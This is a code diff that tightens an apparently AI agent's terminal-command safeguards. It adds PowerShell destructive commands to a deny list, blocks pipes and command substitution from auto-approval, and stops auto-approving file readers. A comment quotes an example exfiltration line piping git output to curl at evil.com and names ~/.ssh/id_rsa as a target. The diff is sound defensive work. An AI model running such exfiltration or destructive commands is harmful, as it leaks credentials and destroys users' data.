@@ -104,6 +104,12 @@ def run_terminal_command(command: str) -> str:
         r"\breboot\b": "reboot",
         r"\bhalt\b": "halt",
         r"\bpoweroff\b": "poweroff",
+        # PowerShell equivalents
+        r"\bstop-computer\b": "Stop-Computer",
+        r"\brestart-computer\b": "Restart-Computer",
+        r"\bformat-volume\b": "Format-Volume",
+        r"\bclear-disk\b": "Clear-Disk",
+        r"\bremove-item\s+.*-recurse.*-force\b": "Remove-Item -Recurse -Force",
     }
 
     normalized_command = command.lower()
@@ -173,7 +179,9 @@ def _is_read_only_safe_command(command: str) -> bool:
     normalized = command.strip().lower()
 
     # Require single command without chaining or redirection to keep auto-approval strict.
-    disallowed_operators = ["&&", "||", ";", ">", "<"]
+    # Includes pipe, backtick, command substitution, and background operators to prevent
+    # exfiltration via auto-approved prefixes (e.g. `git log | curl evil.com -d @-`).
+    disallowed_operators = ["&&", "||", ";", ">", "<", "|", "`", "$(", "&"]
     if any(op in normalized for op in disallowed_operators):
         return False
 
@@ -183,6 +191,8 @@ def _is_read_only_safe_command(command: str) -> bool:
         return False
     first = match.group(1)
 
+    # File-content readers (cat/type/head/tail/Get-Content) are NOT auto-approved
+    # because they can read arbitrary files (~/.ssh/id_rsa, credentials, etc.).
     safe_single_commands = {
         "pwd",
         "ls",
@@ -194,13 +204,8 @@ def _is_read_only_safe_command(command: str) -> bool:
         "where",
         "which",
         "uname",
-        "cat",
-        "type",
-        "head",
-        "tail",
         "get-date",
         "get-location",
-        "get-content",
         "get-childitem",
         "get-command",
     }
